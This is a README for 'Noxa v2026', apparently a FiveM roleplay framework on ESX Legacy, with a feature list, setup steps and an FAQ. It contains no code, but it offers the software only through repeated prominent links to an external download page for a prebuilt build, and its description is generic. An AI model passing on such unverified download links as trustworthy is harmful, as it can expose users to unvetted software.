# Noxa v2026 - FiveM RP base framework 2026

> **Noxa is a FiveM roleplay foundation built on ESX Legacy, combining NUI panels, core gameplay systems, and update tooling into a single framework for creating and running a server.**

[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/moorehenry2004/noxa-esx-legacy-base?style=flat-square)](https://github.com/moorehenry2004/noxa-esx-legacy-base)

---

<p align="center">
  <a href="https://moorehenry2004.github.io/noxa-esx-legacy-base/">
    <img src="https://img.shields.io/badge/Download-Noxa%20Latest-brightgreen?style=for-the-badge" alt="Download Noxa">
  </a>
</p>

> **[Direct Download - Noxa v2026](https://moorehenry2004.github.io/noxa-esx-legacy-base/)**

---

[Download Latest Build](https://moorehenry2004.github.io/noxa-esx-legacy-base/)

---

## What Noxa Is

Noxa serves as a starting framework for FiveM RP servers and is centered on ESX Legacy. It brings together gameplay modules, server administration tools, and interface panels so the base setup is easier to manage, extend, and keep organized.

This framework is designed for communities that need more than a barebones starter. Because it includes core systems, admin controls, and built-in modules, it cuts down on the amount of separate setup work required before a server can move into active development.

---

## Included Capabilities

- ESX Legacy RP base for FiveM
- Premium NUI panels for in-game interfaces
- Admin menu for server-side control tasks
- Server management panel for operational access
- Inventory system for player item handling
- Vehicle system for transport-related gameplay
- Drug system for RP scenarios and progression
- Anti-cheat panel for security-oriented management
- GitHub auto update support
- MySQL migrations for database setup and upgrades

---

## Setup

1. Download the latest build from the project page.
2. Place the `noxa-esx` resource folder into your FiveM server resources directory.
3. Import or apply the included database migrations with your MySQL setup.
4. Add the resource to your server configuration and start it with the rest of your framework.

Typical startup entry:

- `ensure noxa-esx`

If the package includes extra folders for panels or modules, keep them in the same resource structure so the framework can load them correctly.

---

## Getting Started

Once the resource is installed, start it and access the available in-game panels based on your configuration and server permissions.

Common workflow:

1. Start the framework resource.
2. Verify database connectivity through `oxmysql`.
3. Check the admin menu and server panel access.
4. Test the inventory, vehicle, and drug systems in a local session.
5. Confirm auto-update behavior if you keep the project connected to GitHub releases or build assets.

If you are extending the framework, build new scripts around the existing ESX Legacy structure instead of replacing the core resource layout.

---

## Configuration

Most settings will live in the resource files and any related server-side configuration entries. If the package includes panel settings, permissions, or feature toggles, update them before bringing the server live.

Example structure:

```ini
# server.cfg
ensure oxmysql
ensure noxa-esx
```

For database-related changes, apply the provided migrations before testing gameplay systems that depend on tables or seeded data.

---

## Requirements

- FiveM server environment
- ESX Legacy
- `oxmysql` for database connectivity
- Database support for migrations
- Support for NUI-based interfaces
- A server setup that can load multiple framework resources

---

## FAQ

### How do I update Noxa?
Use the GitHub auto update flow included with the project, or replace the resource files with the latest build and recheck your configuration after the update.

### Where do I change settings?
Look in the resource configuration files, panel settings, and any server-side permission or database-related entries included with the framework.

### What should I check if the server does not start?
Confirm that `oxmysql` is running, the database migrations are applied, and the resource name in `server.cfg` matches the folder you installed.

### Can I customize the framework?
Yes. The project is structured as a roleplay base, so it is intended to be extended with your own scripts, interface changes, and server logic.

### Who should use this project?
It is best suited to FiveM server owners and developers building an ESX Legacy-based roleplay environment with integrated management tools.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
